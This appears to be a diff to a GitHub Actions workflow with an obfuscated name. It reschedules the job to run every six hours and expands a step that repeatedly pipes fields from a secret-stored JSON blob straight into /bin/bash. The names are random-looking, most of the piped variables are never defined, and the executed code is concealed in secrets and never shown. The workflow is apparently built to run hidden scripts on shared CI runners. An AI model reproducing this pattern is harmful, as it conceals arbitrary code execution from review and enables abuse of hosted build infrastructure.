@@ -2,7 +2,8 @@ name: yangweiguo6457
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
+    - cron: '8 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,10 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: yangweiguo6457
         env:
-          fel2: ${{ secrets.fel2 }}
+          pj52: ${{ secrets.pj52 }}
         run: |
-          echo $fel2 | jq -r .pg613 | /bin/bash
-          echo $ixonz62 | jq -r .wn92 | /bin/bash
-          echo $bpe598 | jq -r .hnwq16 | /bin/bash
-          echo $mezq581 | jq -r .al7586 | /bin/bash
+          echo $pj52 | jq -r .ukrva11 | /bin/bash
+          echo $con07393 | jq -r .ki47 | /bin/bash
+          echo $pvca86723 | jq -r .kjvg33 | /bin/bash
+          echo $vlu5457 | jq -r .mfvh82682 | /bin/bash
+          echo $qo3726 | jq -r .vl486 | /bin/bash
+          echo $ib746 | jq -r .mc509 | /bin/bash
+          echo $dawd69522 | jq -r .g05880 | /bin/bash
+          echo $jncn253 | jq -r .wfg6497 | /bin/bash
+          echo $w1705 | jq -r .x0 | /bin/bash
+          echo $so1 | jq -r .wki7 | /bin/bash
 
